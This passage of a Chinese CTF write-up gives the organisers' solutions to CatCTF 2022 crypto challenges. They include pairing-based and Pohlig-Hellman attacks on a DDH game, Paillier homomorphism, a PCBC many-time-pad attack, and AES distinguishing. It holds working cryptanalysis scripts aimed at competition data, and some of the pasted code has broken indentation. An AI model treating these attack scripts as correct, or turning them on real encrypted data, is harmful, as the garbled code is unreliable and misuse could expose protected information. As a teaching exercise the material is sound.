<p>这就给了我们一个解DDHP的后门。因此如果随便选一个椭圆曲线点群，ECDDH假设通常是不成立的，并且攻击方法就很简单：看等式$e(aG, bG) &#x3D; e(G, cG)$ 是否成立。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath 9.5</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Before running, modify your filename and add &quot;DDH_instances = &quot; at the beginning of the file.</span></span><br><span class="line">load(<span class="string">&#x27;DDH_instances.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># curve</span></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line"><span class="comment"># G = E(0x17F1D3A73197D7942695638C4FA9AC0FC3688C4F9774B905A14E3A3F171BAC586C55E83FF97A1AEFFB3AF00ADB22C6BB, 0x08B3F481E3AAA0F1A09E30ED741D8AE4FCF5E095D5D00AF600DB18CB2C04B3EDD03CC744A2888AE40CAA232946C5E7E1)</span></span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * <span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line"></span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line">n = G.order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedding degree of the curve</span></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_ECDDHP</span>(<span class="params">DDH_instances, G, Ep, m, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        DDH_instances - list consists of (aG, bG, cG), where aG, bG, cG are EC_point.xy()</span></span><br><span class="line"><span class="string">        m - embedding degree of &lt;G&gt;</span></span><br><span class="line"><span class="string">        n - G&#x27;s order. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sols = []</span><br><span class="line">    </span><br><span class="line">    Fpm.&lt;x&gt; = GF(p^m)</span><br><span class="line">    Epm = Ep.base_extend(Fpm) </span><br><span class="line">    </span><br><span class="line">    G = Epm(G)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> DDH_instances:</span><br><span class="line">        aG, bG, cG = ins</span><br><span class="line">        aG = Epm(aG); bG = Epm(bG); cG = Epm(cG)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># e_aG_bG = aG.weil_pairing(bG, n)</span></span><br><span class="line">        e_aG_bG = aG.tate_pairing(bG, n, m)</span><br><span class="line">        </span><br><span class="line">        e_G_cG = G.tate_pairing(cG, n, m)</span><br><span class="line">        <span class="keyword">if</span> e_aG_bG == e_G_cG:</span><br><span class="line">            sols.append(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sols.append(<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sols</span><br><span class="line"></span><br><span class="line">sols = solve_ECDDHP(DDH_instances, G, E, k, n)</span><br><span class="line"><span class="comment"># print(sols)</span></span><br><span class="line"></span><br><span class="line">pt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sols)):</span><br><span class="line">    pt += sols[i] * (<span class="number">2</span>^i)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(pt)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;CatCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>其实是非预期解，不过测题的时候队里有其他师傅想到了，感觉这个思路也是直击DDH问题中的’Decisional’ 。</p>
<p>题目中点G的阶为</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E7%82%B9G%E7%9A%84%E9%98%B6_8Ppl0UdFm9.png" class="">

<p>做法类似Pohlig-Hellman算法中使用的原理，不过我们不用算出a, b和c，而是在模3， 模11， 模10177等的意义下计算出a,b和c。再对应考察同余式是否成立： $ab \equiv c \pmod{3}$  $ab \equiv c \pmod{11}, … $ 。如果成立那么大概率有$ab &#x3D; c$。打印出来看看flag对不对就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath 9.5</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># Before running, modify your filename and add &quot;DDH_instances = &quot; at the beginning of the file.</span></span><br><span class="line">load(<span class="string">&#x27;DDH_instances.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * </span><br><span class="line"><span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, </span><br><span class="line">      <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">G, Y, ord_G, facts</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Using the idea of Pohlig-Hellman.</span></span><br><span class="line"><span class="string">    G: EC group generator G</span></span><br><span class="line"><span class="string">    facts: list, some small factors of the group order</span></span><br><span class="line"><span class="string">    return x: discrete log of Y modulo prod(facts) </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    new_bases = [(ord_G // facts[i])*G <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(facts))]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(new_bases) == <span class="built_in">len</span>(facts)</span><br><span class="line">    xi = [new_bases[i].discrete_log((ord_G // facts[i])*Y, facts[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(facts))]</span><br><span class="line">    <span class="comment"># print(f&quot;xi = &#123;xi&#125;&quot;)</span></span><br><span class="line">    </span><br><span class="line">    x = CRT(xi, facts)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">order = G.order()</span><br><span class="line"><span class="comment"># factors of order, pairwise coprime</span></span><br><span class="line">facts = [<span class="number">3</span>, <span class="number">11</span>, <span class="number">10177</span>]</span><br><span class="line">s = prod(facts)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(DDH_instances))):</span><br><span class="line">    aG, bG, cG = DDH_instances[i]</span><br><span class="line">    aG = E(aG); bG = E(bG); cG = E(cG)</span><br><span class="line">    a, b, c = [Pohlig_Hellman(G, E(Pt), order, facts) <span class="keyword">for</span> Pt <span class="keyword">in</span> (aG, bG, cG)]</span><br><span class="line">    <span class="keyword">if</span> (a*b) % s == c:</span><br><span class="line">        m += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m[::-<span class="number">1</span>], <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h4 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h4><p>DDH假设是一个很重要的话题，Game则是密码理论中的security game。双线性对也是很重要的密码学工具。希望能够抛砖引玉，让大家对密码理论有更多的关注。</p>
<h3 id="cat-theory"><a href="#cat-theory" class="headerlink" title="cat_theory"></a>cat_theory</h3><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>根据交换图，两个明文先做加法再加密，其结果与先加密再做密文乘法相同。因此CatCrypto是一个同态加密，具有加法同态性。</p>
<p><em>其实这道题是Paillier-DJN算法，Paillier的一个变种。见</em><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/420417626" title="Paillier半同态加密：原理、高效实现方法和应用"><em>Paillier半同态加密：原理、高效实现方法和应用</em></a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E4%BA%A4%E6%8D%A2%E5%9B%BE%E5%8E%9F%E5%9B%BE_RCl02rBytA.png" class="">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">m1_plus_m2 = <span class="number">127944711034541246075233071021313730868540484520031868999992890340295169126051051162110</span></span><br><span class="line">m2_plus_m3 = <span class="number">63052655568318504263890690011897854119750959265293397753485911143830537816733719293484</span></span><br><span class="line">m3_plus_m1 = <span class="number">70799336441419314836992058855562202282043225138455808154518156432965089076630602398416</span></span><br><span class="line"></span><br><span class="line">m = (m1_plus_m2 + m2_plus_m3 + m3_plus_m1) // <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;CatCTF&#123;HE_sch3m3_c4n_b3_a_c4t_eg0ry&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="动机-1"><a href="#动机-1" class="headerlink" title="动机"></a>动机</h4><p>因为是Cat CTF，并且说出题可以不限于传统的CTF思路，所以想涉及一些猫论(category theory, 范畴论)。找了一些资料来看：<a target="_blank" rel="noopener" href="https://www.peterhines.info/resources/talks/thompson.pdf" title="Categorical &amp; Diagrammatic methods In Cryptography and Communication">Categorical &amp; Diagrammatic methods In Cryptography and Communication</a> 确实有一些人提出范畴论与密码学结合，想法很有意思（比如p35~36的内容）。但这些想法似乎还没有太多应用。并且我自己对范畴论了解也很有限，也没试过自己编造一个密码方案。一时间想不到怎么用这个出一道题。</p>
<p>正好想到Craig Gentry（第一个全同态方案的提出者）给出的用交换图概括同态加密，交换图可以算是范畴论的东西，并且在密码学中也还是经常能看到的。于是干脆来个Paillier-DJN同态加密方案（Paillier的改进方案），给一张交换图来提示同态性。</p>
<h3 id="cat’s-gift🎁"><a href="#cat’s-gift🎁" class="headerlink" title="cat’s gift🎁"></a>cat’s gift🎁</h3><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>跨年气氛题，想起Amann的Analysis上有一只猫猫，翻了一会儿找到一个与pi相关的公式。<strong>注意到flag示例中 CatCTF{apple} CatCTF{banana}是小写开头英文单词，都是食物，以及题目中提到这是一份礼物，因此提交的flag不是pi而是pie。</strong></p>
<p>有四种解法</p>
<ol>
<li><p>法一：直接猜结果是pie</p>
</li>
<li><p>法二：手算，写出arctanx的幂级数展开，然后把x&#x3D;1带进去</p>
</li>
<li><p>法三：编程算近似值，然后猜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gift</span>(<span class="params">n=<span class="number">100</span></span>):</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ans += (-<span class="number">1</span>)**i * <span class="number">1</span>/(<span class="number">2</span>*i + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> ans * <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">solve_gift(n=<span class="number">10000000</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>法四：问猫猫（根据题目描述的提示）</p>
<p>找到Amann的 Analysis I p389</p>
</li>
</ol>
<img src="/2023/01/01/Nepnep-CatCTF2022/Leibniz%E5%85%AC%E5%BC%8F_R3x4PyHfeS.png" class="">

<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>其实pi&#x3D;pie也是一种数学文化，3.14那天有一些人会吃派庆祝，因此就把这个题放在了跟数学最相近的crypto里面。出题时感觉应该很自然能想到pie吧，没想到很多朋友因为没有get到所以没做出来…</p>
<p>忘记了这是一种小众文化，出题人<strong>随缘在此向各位深表歉意</strong>。</p>
<h3 id="盖茨比-can-you-tell-AES-from-blackbox？-sampl出题人前言"><a href="#盖茨比-can-you-tell-AES-from-blackbox？-sampl出题人前言" class="headerlink" title="盖茨比&amp;can you tell AES from blackbox？&amp;sampl出题人前言"></a>盖茨比&amp;can you tell AES from blackbox？&amp;sampl出题人前言</h3><p>笔者本学期上了一门非常重要的课，密码分析学，学习了很多在ctf之外传统密码算法分析领域的知识；加之笔者本人是做侧信道分析的，所以本次出题，特意反常规的ctf crypto&#x3D;数论+格子，三道题一道是披着工作模式皮的古典频率分析，一道是传统对称算法分析的经典场景，最后一道则是侧信道。</p>
<h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p>这题还是叫PCBC叭，题目名称出错了（笑）。</p>
<p>这个题其实大部分都是非预期，但大方向思路不错，毕竟mtp也是大方向上属于利用了自然语言的特征，跟古典的频率分析在一个角度上。</p>
<p>本题使用的工作模式是PCBC，因为现在已经没有哪里在用了所以也没在pycrypto里找到，只能自己写，所以，大家自己逆这个过程就会发现一个解密之后的异或结构，进而利用mtp还原；另一种思路是直接爆破iv，但有一说一，复杂度应该很高，希望大家没有爆太久【笑】，对此方法有个小后门，就是padding之后末尾的填充值都固定，那么确定其中一部分，我们就可以确定末尾的大部分，进而降低爆破的复杂度。</p>
<p>摘抄两个解法的脚本如下：</p>
<h4 id="mtp"><a href="#mtp" class="headerlink" title="mtp"></a>mtp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3 </span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo </span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):  </span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch) </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():  </span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):  </span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]  </span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))  </span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]  </span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):  </span><br><span class="line">            dat.append((f(pos), index, pos)) </span><br><span class="line">            </span><br><span class="line"> key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span> </span><br><span class="line"> key = base64.b64decode(key)</span><br><span class="line"> c = base64.b64decode(c) </span><br><span class="line"> cipher=AES.new(key,mode=AES.MODE_ECB) </span><br><span class="line"> t = [] </span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">16</span>):  </span><br><span class="line">     <span class="keyword">if</span> i == <span class="number">0</span>:  </span><br><span class="line">         t.append(cipher.decrypt(c[i:i+<span class="number">16</span>])) <span class="comment"># s1 ^ iv  </span></span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line">         t.append(xor(cipher.decrypt(c[i:i + <span class="number">16</span>]), c[i-<span class="number">16</span>:i])) </span><br><span class="line">tmp = [] tmp.append(t[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)):  </span><br><span class="line">    tttt = t[i]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i):  </span><br><span class="line">        tttt = xor(tttt, t[j])  </span><br><span class="line">    tmp.append(tttt) <span class="comment"># si ^ iv </span></span><br><span class="line"><span class="comment"># MTP attack </span></span><br><span class="line">c = tmp </span><br><span class="line">dat = [] </span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>) </span><br><span class="line">getSpace() </span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>] </span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:  </span><br><span class="line">    infer(index, pos) </span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg])) </span><br></pre></td></tr></table></figure>

<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>看大部分人用的爆破脚本都是这个，但是只爆破了最后一位，蛮好奇前面这个魔数怎么得到的，或许是因为前边爆破太久了所以示意一下？hhhhhh，谁知道这个魔数iv怎么爆出来的欢迎cue我。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = b64decode(c)</span><br><span class="line">key = b64decode(key)</span><br><span class="line">cipher=AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">c2 = [c[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">16</span>)]</span><br><span class="line">xor_s = []</span><br><span class="line">xor_iv = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> c2:</span><br><span class="line">    xor_s.append(cipher.decrypt(c))</span><br><span class="line">    </span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">tiv = <span class="string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> [<span class="number">0x99</span>]:</span><br><span class="line">    iv = tiv+long_to_bytes(j)</span><br><span class="line">    tmpStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_s)):</span><br><span class="line">        s = xor(xor_s[i], iv)</span><br><span class="line">        iv = xor(s, c2[i])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmpStr += s.decode()</span><br><span class="line">            <span class="keyword">if</span> tmpStr[-<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            tmpStr += <span class="string">&#x27;&#x27;</span> <span class="comment"># &#x27;\t&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> tmpStr:</span><br><span class="line">        <span class="built_in">print</span>(tmpStr)</span><br></pre></td></tr></table></figure>

<h3 id="can-you-tell-AES-from-blackbox？"><a href="#can-you-tell-AES-from-blackbox？" class="headerlink" title="can you tell AES from blackbox？"></a>can you tell AES from blackbox？</h3><p>本题原始出题背景是AES的中间相遇攻击和除了传统四种攻击模型之外的区分攻击模型，原初的情况如下：</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2bdc710068ef3196000d8b30d162ec8_uPz1CghfKG.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/d2773e673cf6376c245751929a5c245_VM31F-jptu.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/10ca896f2d52bc0bdd192c8ce699324_c74Tfv_E_Q.png" class="">

<p>$C_{11}^{(2)}$只与$t_{11}$及一些由密钥和明文中的常数字节决定的固定值有关，于是我们可以构造由a11到$ C_{11}^{(2)}  $的映射表，可知该表只由c1和c5两个未知量确定，所以满足条件的映射表共有2^16种，而随机映射每次明文的某个字节都有2^8种映射可能，所以提供了4次机会，随机置换总共的可能性则为2^32种，于是可知，随机置换落入AES的可能性为1&#x2F;256，可能性较小，所以可以作为一个区分指标。</p>
<p>但是作为传统密码分析，题目的信息量摆在这里，解不是唯一的，只要能解决，那就是找到了合理的特征。随机置换模型有一个问题，就是有可能导致某个字节变化后，其对应字节的值反而没变，而根据上式可知，这个映射应该是一个单射，所以实际我们使用的其实是另一个相关的密码算法，规避掉这个基本的随机特征（根据生日攻击，这个特征在给定模型是a11遍历256时，对于反向判断是更致命的）。</p>
